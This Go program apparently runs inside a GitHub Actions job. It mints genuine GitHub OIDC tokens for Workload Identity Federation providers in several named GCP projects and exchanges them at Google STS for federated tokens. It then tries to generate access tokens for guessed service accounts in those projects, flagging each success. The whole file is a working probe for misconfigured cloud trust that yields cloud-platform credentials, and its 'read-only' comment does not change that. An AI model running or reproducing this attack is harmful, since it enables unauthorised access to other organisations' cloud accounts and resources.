package main

// Intent 42009: mint genuine GitHub OIDC tokens for NEW GCP projects' WIF providers,
// try STS exchange, then attempt SA impersonation. READ-ONLY, no writes to target.

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var client = &http.Client{Timeout: 45 * time.Second}

var providers = map[string]string{
	"507686559040": "//iam.googleapis.com/projects/507686559040/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
	"202458047894": "//iam.googleapis.com/projects/202458047894/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
	"434644661130": "//iam.googleapis.com/projects/434644661130/locations/global/workloadIdentityPools/github-actions/providers/github",
	"369001918367": "//iam.googleapis.com/projects/369001918367/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
	"597679076120": "//iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider", // control (known)
}

var saCands = map[string][]string{
	"507686559040": {
		"507686559040@cloudbuild.gserviceaccount.com",
		"507686559040-compute@developer.gserviceaccount.com",
		"github-actions@rcmd-staging.iam.gserviceaccount.com",
		"cloudbuild@rcmd-staging.iam.gserviceaccount.com",
		"deploy@rcmd-staging.iam.gserviceaccount.com",
		"rcmd-operator@rcmd-staging.iam.gserviceaccount.com",
		"terraform@rcmd-staging.iam.gserviceaccount.com",
		"github-actions@507686559040.iam.gserviceaccount.com",
	},
	"202458047894": {
		"202458047894@cloudbuild.gserviceaccount.com",
		"202458047894-compute@developer.gserviceaccount.com",
		"github-actions@rcmd-qa.iam.gserviceaccount.com",
		"cloudbuild@rcmd-qa.iam.gserviceaccount.com",
		"deploy@rcmd-qa.iam.gserviceaccount.com",
		"rcmd-operator@rcmd-qa.iam.gserviceaccount.com",
		"terraform@rcmd-qa.iam.gserviceaccount.com",
		"github-actions@202458047894.iam.gserviceaccount.com",
	},
	"434644661130": {
		"434644661130@cloudbuild.gserviceaccount.com",
		"434644661130-compute@developer.gserviceaccount.com",
		"github-actions@jira.iam.gserviceaccount.com",
		"cloudbuild@jira.iam.gserviceaccount.com",
		"deploy@jira.iam.gserviceaccount.com",
		"github-actions@434644661130.iam.gserviceaccount.com",
	},
	"369001918367": {
		"369001918367@cloudbuild.gserviceaccount.com",
		"369001918367-compute@developer.gserviceaccount.com",
	},
}

func httpDo(method, u, bearer string, body []byte) (int, string) {
	var rdr io.Reader
	if body != nil {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, u, rdr)
	if err != nil {
		return 0, "req-err:" + err.Error()
	}
	if bearer != "" {
		req.Header.Set("Authorization", "Bearer "+bearer)
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "do-error:" + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

func trim(s string, n int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) > n {
		return s[:n]
	}
	return s
}

func mintJWT(aud string) (string, string) {
	reqURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	reqTok := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	if reqURL == "" {
		return "", "no ACTIONS_ID_TOKEN_REQUEST_URL"
	}
	u := reqURL + "&audience=" + url.QueryEscape(aud)
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("Authorization", "bearer "+reqTok)
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", "oidc-err:" + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	var o struct {
		Value string `json:"value"`
	}
	json.Unmarshal(b, &o)
	return o.Value, string(b)
}

func claim(jwt, key string) string {
	p := strings.Split(jwt, ".")
	if len(p) != 3 {
		return ""
	}
	raw, err := base64.RawURLEncoding.DecodeString(p[1])
	if err != nil {
		raw, err = base64.URLEncoding.DecodeString(p[1])
		if err != nil {
			return ""
		}
	}
	var m map[string]interface{}
	json.Unmarshal(raw, &m)
	if v, ok := m[key]; ok {
		return fmt.Sprintf("%v", v)
	}
	return ""
}

func main() {
	fmt.Println("=== INTENT42009 WIF NEW-PROJECT PROBE START ===")
	order := []string{"507686559040", "202458047894", "434644661130", "369001918367", "597679076120"}
	for _, pn := range order {
		aud := providers[pn]
		fmt.Println("###### PROJECT", pn)
		jwt, raw := mintJWT(aud)
		if jwt == "" {
			fmt.Println("MINT_FAIL:", trim(raw, 200))
			continue
		}
		fmt.Printf("JWT sub=%s repo=%s aud_claim=%s iss=%s\n", claim(jwt, "sub"), claim(jwt, "repository"), claim(jwt, "aud"), claim(jwt, "iss"))
		sbody, _ := json.Marshal(map[string]string{
			"audience":           aud,
			"grantType":          "urn:ietf:params:oauth:grant-type:token-exchange",
			"requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
			"scope":              "https://www.googleapis.com/auth/cloud-platform",
			"subjectTokenType":   "urn:ietf:params:oauth:token-type:jwt",
			"subjectToken":       jwt,
		})
		st, sb := httpDo("POST", "https://sts.googleapis.com/v1/token", "", sbody)
		fmt.Printf("STS_STATUS=%d BODY=%s\n", st, trim(sb, 260))
		var tok struct {
			AccessToken string `json:"access_token"`
		}
		json.Unmarshal([]byte(sb), &tok)
		ft := tok.AccessToken
		if ft == "" {
			continue
		}
		fmt.Println("FEDERATED_TOKEN_OBTAINED len=", len(ft))
		for _, email := range saCands[pn] {
			u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape(email) + ":generateAccessToken"
			bd, _ := json.Marshal(map[string]interface{}{"scope": []string{"https://www.googleapis.com/auth/cloud-platform"}, "lifetime": "300s"})
			s, body := httpDo("POST", u, ft, bd)
			mark := ""
			if s == 200 {
				mark = " <<<<< SUCCESS"
			}
			fmt.Printf("GENAT[%s]: %d %s%s\n", email, s, trim(body, 130), mark)
		}
	}
	fmt.Println("=== INTENT42009 WIF NEW-PROJECT PROBE END ===")
}
